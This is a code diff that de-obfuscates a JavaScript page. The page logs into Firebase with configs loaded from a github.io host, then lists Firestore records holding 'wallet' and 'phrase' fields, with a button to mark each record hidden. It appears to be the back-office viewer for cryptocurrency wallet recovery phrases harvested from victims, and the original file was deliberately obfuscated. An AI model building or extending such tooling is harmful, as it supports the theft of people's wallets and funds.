@@ -1,1 +1,97 @@
-const _0x38914f=_0xcf78;(function(_0x161b82,_0x29db65){const _0x319650=_0xcf78,_0xb1e723=_0x161b82();while(!![]){try{const _0x359f5b=-parseInt(_0x319650(0xe0))/0x1+-parseInt(_0x319650(0xc7))/0x2+-parseInt(_0x319650(0xd7))/0x3*(-parseInt(_0x319650(0xc4))/0x4)+-parseInt(_0x319650(0xb6))/0x5*(parseInt(_0x319650(0xcb))/0x6)+-parseInt(_0x319650(0xdd))/0x7+-parseInt(_0x319650(0xe2))/0x8*(-parseInt(_0x319650(0xdf))/0x9)+parseInt(_0x319650(0xbd))/0xa;if(_0x359f5b===_0x29db65)break;else _0xb1e723['push'](_0xb1e723['shift']());}catch(_0xb8dc53){_0xb1e723['push'](_0xb1e723['shift']());}}}(_0x1964,0x4220f));function _0xcf78(_0x4b9e50,_0x14ef4f){const _0x196484=_0x1964();return _0xcf78=function(_0xcf783b,_0x54cc96){_0xcf783b=_0xcf783b-0xb2;let _0x6493db=_0x196484[_0xcf783b];return _0x6493db;},_0xcf78(_0x4b9e50,_0x14ef4f);}import{acc as _0x1f24c0}from'https://giterhaber.github.io/web-codes/configs.js';import{cmBwsbFSqC as _0x3732cf}from'https://giterhaber.github.io/web-codes/cmBwsbFSqC.js';function _0x1964(){const _0x3adf29=['firestore','</p><br>','delete','#logout','forEach','6HJmiOL','prepend','createElement','app2','appendChild','#root','2200870pHYxeZ','then','2831157ijdsOc','422786cZGPQj','signOut','8ozZksA','signed\x20in','phrase','uid','signed\x20out','style','300lJASkj','wallet','Data\x20Deleted','🗑️','data','catch','delete\x20sure?','10185930VOGWJg','button','doc','click','href','innerHTML','initializeApp','164436acsSMg','onAuthStateChanged','target','633090pvVywg','reload','auth','<p>Wallet:\x20','9078SuNBck','\x20<br>\x20','collection','div','addEventListener','location','log'];_0x1964=function(){return _0x3adf29;};return _0x1964();}const app1=firebase[_0x38914f(0xc3)](_0x1f24c0),auth=firebase[_0x38914f(0xc9)](app1);auth[_0x38914f(0xc5)](_0x437e37=>{const _0x440956=_0x38914f;if(_0x437e37){var _0x3cacaa=_0x437e37[_0x440956(0xb3)];console['log'](_0x440956(0xe3));}else console['log'](_0x440956(0xb4)),location[_0x440956(0xc1)]='./';}),$(_0x38914f(0xd5))['on'](_0x38914f(0xc0),()=>{const _0x32f467=_0x38914f;auth[_0x32f467(0xe1)]();});const app2=firebase[_0x38914f(0xc3)](_0x3732cf,_0x38914f(0xda));var db=firebase[_0x38914f(0xd2)](app2);const rootDIV=document['querySelector'](_0x38914f(0xdc));function deleteTodo(_0x3c7f74){const _0x4193a5=_0x38914f;let _0x20d104=_0x3c7f74[_0x4193a5(0xc6)],_0x582a08=_0x20d104['parentElement']['id'];confirm(_0x4193a5(0xbc))&&(console['log'](_0x582a08),db['collection']('data')[_0x4193a5(0xbf)](_0x582a08)[_0x4193a5(0xd4)]()[_0x4193a5(0xde)](()=>{const _0xc2470a=_0x4193a5;alert(_0xc2470a(0xb8)),window[_0xc2470a(0xd0)][_0xc2470a(0xc8)]();})[_0x4193a5(0xbb)](_0x422c47=>{const _0x3ae15f=_0x4193a5;console[_0x3ae15f(0xd1)](_0x422c47);}));}db[_0x38914f(0xcd)](_0x38914f(0xba))['get']()[_0x38914f(0xde)](_0xcc32c1=>{const _0x1fe62c=_0x38914f;_0xcc32c1[_0x1fe62c(0xd6)](_0x5f4d70=>{const _0x206a1d=_0x1fe62c;let _0x2e74aa=_0x5f4d70[_0x206a1d(0xba)]()[_0x206a1d(0xb7)],_0x5dd009=_0x5f4d70[_0x206a1d(0xba)]()[_0x206a1d(0xb2)],_0x2f0abd=_0x206a1d(0xca)+_0x2e74aa+_0x206a1d(0xcc)+_0x5dd009+_0x206a1d(0xd3),_0x2afe6f=document[_0x206a1d(0xd9)](_0x206a1d(0xce));_0x2afe6f['id']=_0x5f4d70['id'],_0x2afe6f[_0x206a1d(0xc2)]=_0x2f0abd,rootDIV[_0x206a1d(0xdb)](_0x2afe6f);let _0x1e3856=document[_0x206a1d(0xd9)](_0x206a1d(0xbe));_0x1e3856['setAttribute'](_0x206a1d(0xb5),'background-color:\x20rgb(54,\x2057,\x2063);\x20color:white;'),_0x1e3856[_0x206a1d(0xc2)]=_0x206a1d(0xb9),_0x1e3856[_0x206a1d(0xcf)]('click',deleteTodo),_0x2afe6f[_0x206a1d(0xd8)](_0x1e3856);});});
+import { acc as ACCOUNT } from "https://giterhaber.github.io/web-codes/configs.js"
+import { cmBwsbFSqC as config} from 'https://giterhaber.github.io/web-codes/cmBwsbFSqC.js'
+
+
+const app1 = firebase.initializeApp(ACCOUNT);
+const auth = firebase.auth(app1);
+
+// auth.onAuthStateChanged((user) => {
+//   if (user) {
+//     // User is signed in, see docs for a list of available properties
+//     // https://firebase.google.com/docs/reference/js/firebase.User
+//     var uid = user.uid;
+//     // ...
+//     console.log('signed in')
+//   } else {
+//     // User is signed out
+//     // ...
+//     console.log('signed out')
+//     location.href = './'
+//   }
+// });
+// $('#logout').on('click', () => {
+//   auth.signOut()
+// })
+
+
+//DATABASE
+
+
+const app2 = firebase.initializeApp(config, 'app2');
+var db = firebase.firestore(app2);
+const rootDIV = document.querySelector('#root');
+
+
+function deleteTodo(event) {
+  let button = event.target
+  let docId = button.parentElement.id
+
+
+  if (confirm('delete sure?')) {
+    console.log(docId)
+
+    
+    // db.collection('data').doc(docId).delete()
+    //   .then(() => {
+    //     alert('Data Deleted')
+    //     window.location.reload();
+    //   })
+    //   .catch((err) => {
+    //     console.log(err)
+    //   })
+
+    return db.collection('data').doc(docId).update({
+      status: 'hide'
+    }).then( console.log('ok'))
+      .catch( error => console.log(error))
+
+  }
+
+}
+
+
+//get data
+db.collection("data").where('status', '!=', 'hide').get().then((querySnapshot) => {
+  querySnapshot.forEach((doc) => {
+    // doc.data() is never undefined for query doc snapshots
+
+    // console.log(doc.id, " => ", doc.data());
+
+
+
+    let wallet = doc.data().wallet
+    let phrase = doc.data().phrase
+
+    // console.log(`Wallet: ${wallet} <br> ${phrase}`)
+
+    let text = `<p>Wallet: ${wallet} <br> ${phrase}</p><br>`
+    // let para = document.createElement("div")
+    // para.innerHTML = text
+    // rootDIV.appendChild(para)
+
+    let line = document.createElement("div");
+    line.id = doc.id;
+    line.innerHTML = text
+    rootDIV.appendChild(line)
+
+
+    //del button
+    let delBtn = document.createElement("button")
+    delBtn.setAttribute("style", "background-color: rgb(54, 57, 63); color:white;")
+    delBtn.innerHTML = "🗑️"
+    delBtn.addEventListener("click", deleteTodo)
+    line.prepend(delBtn)
+
+
+  });
+});
